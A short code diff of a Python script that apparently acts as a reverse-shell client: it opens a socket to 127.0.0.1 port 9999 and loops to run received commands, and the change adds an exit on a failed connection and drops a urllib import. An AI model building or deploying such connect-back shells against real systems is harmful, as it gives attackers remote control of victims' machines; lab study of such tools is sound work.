@@ -1,11 +1,8 @@
 import socket
 import os
 import subprocess
-import urllib.request
+from sys import exit
 
-#TODO
-
-# get os type, get log of what's sent and executed (just unit test)
 
 def pwd():
     """Return current working directory."""
@@ -55,7 +52,11 @@ def command(cmd):
 def main():
 
     conn = socket.socket()
-    conn.connect(('127.0.0.1', 9999))
+
+    try:
+        conn.connect(('127.0.0.1', 9999))
+    except:
+        exit()
 
     while True:
         cwd = os.getcwd()
